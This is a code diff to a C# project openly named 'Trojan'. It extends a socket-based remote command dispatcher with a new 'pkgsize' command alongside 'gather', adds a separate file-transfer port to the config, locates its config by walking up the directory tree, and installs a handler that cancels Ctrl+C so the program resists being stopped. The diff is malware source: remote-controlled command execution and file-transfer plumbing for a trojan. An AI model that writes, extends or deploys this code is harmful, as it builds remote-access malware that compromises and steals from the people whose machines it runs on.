@@ -5,6 +5,8 @@ using System.Net.Sockets;
 using Trojan;
 using Trojan.exceptions;
 using SocketData.operations;
+using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace SocketData
 {
@@ -22,29 +24,35 @@ namespace SocketData
         static List<string> CommandNames = new List<string>
         {
             "gather",
+            "pkgsize"
         };
 
-        public static string CheckForCommand(string input)
+        public static string[] CheckForCommand(string input)
         {
-            string command = input.Split(" ")[1];
+            string[] command_args = input.Split(" ");
+
+            string CommandName = command_args[1];
 
             for (int i = 0; i < CommandNames.Count(); i++)
             {
-                if (command == CommandNames[i])
+                if (CommandName == CommandNames[i])
                 {
-                    return(command);
+                    return(command_args);
                 }
             }
 
-            return ("");
+            return (new string[1] { "" });
         }
 
-        public static string ExecuteCommand(string CommandName)
+        public static string ExecuteCommand(ref socketSetup Connector, ref string[] command_args)
         {
+            string CommandName = command_args[1];
             switch(CommandName)
             {
                 case("gather"):
-                    return(TrojanBaseClass.gather());
+                    return(TrojanBaseClass.gather(command_args));
+                case("pkgsize"):
+                    return(TrojanBaseClass.pkgsize(Connector, command_args));
                 default:
                     return("");
             }
@@ -110,19 +118,6 @@ namespace SocketData
             _buffer = buffer;
         }
 
-        // this is unsafe as getReceiveTask can return null
-        public ServerStatus getConnStatus()
-        {
-            return(_ConnectionStatus);
-        }
-
-        public void setConnStatus(ServerStatus status)
-        {
-            if (status == null) throw new ExceptionHandler("[-] task can not be null : " + nameof(status));
-
-            _ConnectionStatus = status;
-        }
-
         public EndPoint getRemoteEndPoint()
         {
             if (_s_conn.RemoteEndPoint == null) throw new ExceptionHandler("[-] RemoteEndPoint can not be null : " + nameof(_s_conn.RemoteEndPoint));
@@ -180,6 +175,16 @@ namespace SocketData
 
     public class SocketHandler
     {
+        private void _StartConsoleHandler()
+        {
+            Console.CancelKeyPress += new ConsoleCancelEventHandler(CancelEventHandler);
+        }
+
+        private void CancelEventHandler(object sender, ConsoleCancelEventArgs CancelEvent)
+        {
+            CancelEvent.Cancel = true;
+        }
+
         public string TruncationCheckCommand(string command, int startIndex, int length)
         {
             command = command.Substring(startIndex, command.Length - startIndex);
@@ -192,8 +197,11 @@ namespace SocketData
 
         public string RespondToCommand(Socket sock) { return(""); }
 
+        public static string? BasePath = null;
+
         public static IPAddress? HOST = null;
         public static ushort PORT;
+        public static ushort FILE_PORT;
         public static uint BUFFSIZE;
 
         public static ushort MAX_CONNECTIONS;
@@ -214,20 +222,51 @@ namespace SocketData
 
         public SocketHandler()
         {
-            using (StreamReader ConfigFile = new StreamReader(@"C:\Users\kaspe\source\repos\Trojan\trojan-config.cfg"))
+            if (BasePath == null)
+            {
+                bool FoundBasePath = false;
+                #pragma warning disable CS8600 // Converting null literal or possible null value to non-nullable type.
+                string RootPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+
+                if (RootPath != null)
+                {
+                    Environment.CurrentDirectory = RootPath;
+                    IEnumerable<string> Directories = Directory.GetDirectories(Environment.CurrentDirectory);
+
+                    while (!FoundBasePath)
+                    {
+                        FoundBasePath = Directories.Where(directory => directory.EndsWith("Trojan")).Any();
+                        if (FoundBasePath)
+                        {
+                            BasePath = Environment.CurrentDirectory + @"\Trojan";
+                            break;
+                        }
+
+                        Environment.CurrentDirectory = Path.Combine(Environment.CurrentDirectory, "..");
+                        Directories = Directory.GetDirectories(Environment.CurrentDirectory);
+                    }
+                }
+            }
+
+            using (StreamReader ConfigFile = new StreamReader(BasePath + "/trojan-config.cfg"))
             {
                 if (ConfigFile == null) throw new ExceptionHandler("Config file not found : " + nameof(ConfigFile));
-                string line;
+
+                string? line;
+                string[] LineParts;
                 while ((line = ConfigFile.ReadLine()) != null)
                 {
-                    string[] LineParts = line.Split(" ");
+                    LineParts = line.Split(" ");
                     switch (LineParts[0])
                     {
                         case "host":
                             HOST = IPAddress.Parse(LineParts[2]);
                             break;
-                        case "port":
+                        case "host_port":
                             PORT = ushort.Parse(LineParts[2]);
+                            break;
+                        case "file_port":
+                            FILE_PORT = ushort.Parse(LineParts[2]);
                             break;
                         case "buffsize":
                             BUFFSIZE = uint.Parse(LineParts[2]);
@@ -254,6 +293,8 @@ namespace SocketData
                     }
                 }
             }
+
+            Task ConsoleHandlerTask = Task.Factory.StartNew(() => _StartConsoleHandler());
         }
     }
 }
